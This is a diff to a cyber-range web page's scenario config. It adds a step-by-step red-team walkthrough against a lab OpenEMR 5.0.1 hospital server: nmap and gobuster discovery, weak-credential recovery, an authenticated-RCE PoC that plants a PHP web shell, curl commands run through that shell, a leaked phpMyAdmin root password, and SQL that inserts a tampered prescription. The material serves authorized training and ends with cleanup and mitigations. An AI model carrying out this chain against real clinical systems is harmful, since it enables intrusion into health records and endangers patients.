@@ -231,65 +231,243 @@ HARDENING CHECKLIST
 const hospitalScenarios = {
   red: {
     kicker: "Red Team Scenario",
-    title: "Hospital OpenEMR Authenticated RCE Attack Surface",
-    summary: "Students investigate an authorized lab-only OpenEMR 5.0.1 attack path, validate authenticated RCE risk, and understand how application compromise can lead to medication tampering through backend database access.",
-    badges: ["OpenEMR 5.0.1", "TCP/80", "Authenticated RCE", "phpMyAdmin"],
+    title: "Hospital EHR Compromise And Patient Medication Manipulation",
+    summary: "Admin-only attacker walkthrough for the authorized Hospital lab: discover the Windows server, enumerate OpenEMR, recover weak staff credentials, validate authenticated RCE, access phpMyAdmin, alter a dummy prescription, and observe the physical OLED/ECG impact.",
+    badges: ["172.16.17.217", "OpenEMR 5.0.1", "Windows Server", "Patient Safety"],
     steps: [
-      "Open the Hospital OpenEMR application and enumerate the exposed web application version and technology stack.",
-      "Confirm that the target is OpenEMR 5.0.1 and map it to the approved lab exploit reference.",
-      "Use the provided lab account to authenticate and validate that the exploit path requires credentials.",
-      "Start an approved listener on the attacker machine and run only the authorized updated exploit available in the Kali VM on the server.",
-      "After lab access is obtained, inspect the system for phpMyAdmin configuration evidence.",
-      "Review the phpMyAdmin configuration path and recover the database credential used in this training scenario.",
-      "Use phpMyAdmin to identify the patient medication table and understand how unauthorized modification could impact patient safety.",
-      "Restore any changed medication value and hand findings to the Blue Team."
+      "Discover the Hospital server at 172.16.17.217 and enumerate Apache/PHP, MySQL, Windows management services, and the Node.js bridge.",
+      "Use the landing page, robots.txt, and directory enumeration to locate /openemr/, /phpMyAdmin/, and the exposed /backup/ onboarding clue.",
+      "Recover the weak sahil:sahil staff credential and authenticate to OpenEMR.",
+      "Confirm OpenEMR 5.0.1 and use only the approved authenticated-RCE PoC supplied for this lab.",
+      "Validate the uploaded PHP web shell and confirm command execution as NT AUTHORITY\\SYSTEM.",
+      "Read the phpMyAdmin configuration file and recover the lab database credential.",
+      "Access the openemr database, identify Ted Shaw as patient ID 1, and inspect the prescriptions table.",
+      "Insert the controlled HACKED_MEDICATION / 999mg record and capture FLAG{patient_medication_altered}.",
+      "Observe the OLED medication change and dummy ECG flatline behavior, then restore the patient record and collect evidence."
     ],
-    actionTitle: "Hospital Lab Commands",
+    actionTitle: "Hospital Full Attacker Walkthrough",
     commands: `==============================
-ENUMERATION
+LAB DETAILS
 ==============================
-Target application:
-  http://172.16.17.217/openemr
-
-Version to confirm:
-  OpenEMR 5.0.1
-
-Student task:
-  Identify the web application version, technology stack, and authenticated attack surface.
-
+Target:       172.16.17.217
+OpenEMR:      http://172.16.17.217/openemr/
+phpMyAdmin:   http://172.16.17.217/phpMyAdmin/
+Platform:     Windows Server / Apache 2.4.62 / PHP 7.4.0 / MySQL
+Final impact: Dummy patient medication modified
+Final flag:   FLAG{patient_medication_altered}
 
 ==============================
-AUTHENTICATED LAB VALIDATION
+PHASE 1 - NETWORK DISCOVERY
 ==============================
-Lab account:
+ip a
+sudo netdiscover -r 172.16.17.0/24
+
+Expected Hospital server:
+  172.16.17.217
+
+==============================
+PHASE 2 - PORT AND SERVICE ENUMERATION
+==============================
+nmap -sV -sC -p- --min-rate 3000 172.16.17.217
+
+Important services:
+  80/tcp    Apache httpd 2.4.62 ((Win64) PHP/7.4.0)
+  135/tcp   MSRPC
+  139/tcp   NetBIOS
+  445/tcp   Microsoft-DS
+  3000/tcp  Node.js Express
+  3306/tcp  MySQL
+  3389/tcp  RDP
+  5985/tcp  Microsoft HTTPAPI
+
+==============================
+PHASE 3 - WEB AND DIRECTORY DISCOVERY
+==============================
+Open:
+  http://172.16.17.217/
+  http://172.16.17.217/openemr/
+
+gobuster dir -u http://172.16.17.217/ -w /usr/share/wordlists/dirb/common.txt
+curl http://172.16.17.217/robots.txt
+
+Expected paths:
+  /openemr/
+  /phpMyAdmin/
+  /backup/
+
+==============================
+PHASE 4 - CREDENTIAL DISCOVERY
+==============================
+curl http://172.16.17.217/backup/staff_onboarding.txt
+
+Onboarding clue:
+  Assigned user: sahil
+  Temporary password is the same as the username
+
+Lab credential:
   sahil:sahil
 
-Listener used during the approved lab drill:
-  nc -lvnp 4444
+==============================
+PHASE 5 - OPENEMR ACCESS
+==============================
+Login URL:
+  http://172.16.17.217/openemr/
 
-Student task:
-  Validate that the attack path requires authentication and document the observed callback behavior.
-
+Use the recovered lab account and confirm authenticated access.
 
 ==============================
-POST-COMPROMISE REVIEW
+PHASE 6 - VULNERABILITY RESEARCH
 ==============================
-Configuration review path:
-  C:\\Apache24\\htdocs\\phpMyAdmin\\config.inc.php
+searchsploit openemr
+searchsploit -p 49486
 
-phpMyAdmin lab credential found during the exercise:
+Confirmed target:
+  OpenEMR 5.0.1 authenticated remote code execution
+
+Approved reference:
+  OpenEMR_Vulnerabilities/openemr_rce_poc.py
+
+==============================
+PHASE 7 - AUTHENTICATED RCE
+==============================
+cd /home/kali/Hospital/OpenEMR_Vulnerabilities
+python3 openemr_rce_poc.py -h
+python3 openemr_rce_poc.py \
+  -t http://172.16.17.217/openemr \
+  -u sahil \
+  -p sahil
+
+The approved PoC uploads a PHP web shell. Use the exact shell URL
+returned by the lab exploit; do not guess the generated document path.
+
+==============================
+PHASE 8 - CONFIRM COMMAND EXECUTION
+==============================
+Open the generated shell URL with:
+  ?cmd=whoami
+
+Expected result:
+  nt authority\\system
+
+Save the generated URL:
+  SHELLURL='<generated_shell_url>'
+
+Validate:
+  curl "$SHELLURL?cmd=whoami"
+  curl "$SHELLURL?cmd=hostname"
+  curl "$SHELLURL?cmd=ipconfig"
+
+Flag:
+  FLAG{openemr_rce_system}
+
+==============================
+PHASE 9 - READ PHPMYADMIN CONFIG
+==============================
+curl --get --data-urlencode "cmd=type C:\\Apache24\\htdocs\\phpMyAdmin\\config.inc.php" "$SHELLURL"
+
+Recovered lab credential:
   root:hacker@123
 
-Student task:
-  Identify how database access can affect patient medication integrity.
+Configuration path:
+  C:\\Apache24\\htdocs\\phpMyAdmin\\config.inc.php
 
+Intermediate flag:
+  FLAG{phpmyadmin_config_leaked}
 
 ==============================
-SAFETY AND CLEANUP
+PHASE 10 - PHPMYADMIN ACCESS
 ==============================
-Use only the updated exploit already provided in the Kali VM for this lab.
-Restore any medication-table change after observation.
-Hand findings to the Blue Team.`,
+Open:
+  http://172.16.17.217/phpMyAdmin/
+
+Select database:
+  openemr
+
+==============================
+PHASE 11 - PATIENT ENUMERATION
+==============================
+SELECT pid, fname, lname, DOB
+FROM patient_data
+LIMIT 10;
+
+Dummy patient:
+  pid 1 - Ted Shaw
+
+==============================
+PHASE 12 - PRESCRIPTION ENUMERATION
+==============================
+SHOW TABLES LIKE '%pres%';
+SHOW TABLES LIKE '%med%';
+SHOW TABLES LIKE '%drug%';
+
+SELECT *
+FROM prescriptions
+WHERE patient_id = 1;
+
+If no row exists, an UPDATE affects zero rows; use the controlled
+INSERT below for the dummy patient.
+
+==============================
+PHASE 13 - CONTROLLED PRESCRIPTION INSERT
+==============================
+INSERT INTO prescriptions
+(
+ patient_id, txDate, date_added, date_modified, start_date,
+ drug, dosage, quantity, note, active, datetime, \`user\`
+)
+VALUES
+(
+ 1, CURDATE(), CURDATE(), CURDATE(), CURDATE(),
+ 'HACKED_MEDICATION', '999mg', 1,
+ 'FLAG{patient_medication_altered}', 1, NOW(), 'admin'
+);
+
+==============================
+PHASE 14 - VERIFY DATABASE IMPACT
+==============================
+SELECT id, patient_id, txDate, drug, dosage, note, active
+FROM prescriptions
+WHERE patient_id = 1;
+
+Expected controlled record:
+  patient_id: 1
+  drug:       HACKED_MEDICATION
+  dosage:     999mg
+  note:       FLAG{patient_medication_altered}
+
+==============================
+PHASE 15 - OBSERVE PHYSICAL IMPACT
+==============================
+Expected model behavior:
+  OLED: Medication HACKED_MEDICATION / Dosage 999mg
+  ECG:  Dummy graph goes flatline
+
+If the display does not refresh, inspect the ESP8266 polling logic,
+Node.js bridge, database sync interval, and physical connectivity.
+
+==============================
+PHASE 16 - EVIDENCE, RESTORE, AND CLEANUP
+==============================
+Capture evidence from discovery, scans, directory enumeration,
+OpenEMR login, exploit output, SYSTEM command execution, config leak,
+phpMyAdmin, patient_data, prescriptions, and the OLED/ECG model.
+
+Required cleanup:
+  Remove the uploaded lab web shell.
+  Remove or restore the controlled prescription record.
+  Confirm Ted Shaw's approved medication baseline.
+  Verify the OLED and ECG return to their safe state.
+  Rotate the temporary and database lab credentials after the exercise.
+
+Key mitigations:
+  Upgrade OpenEMR.
+  Enforce strong passwords and MFA.
+  Remove backups from the web root.
+  Restrict phpMyAdmin to trusted admin hosts.
+  Use least-privilege database accounts.
+  Store uploads outside executable directories.
+  Monitor prescription changes.
+  Segment the EHR server from medical IoT devices.`,
     links: [
       { label: "Open Hospital OpenEMR", href: hospitalOpenEmrUrl },
       { label: "OpenEMR Exploit Reference", href: openEmrExploitRefUrl }
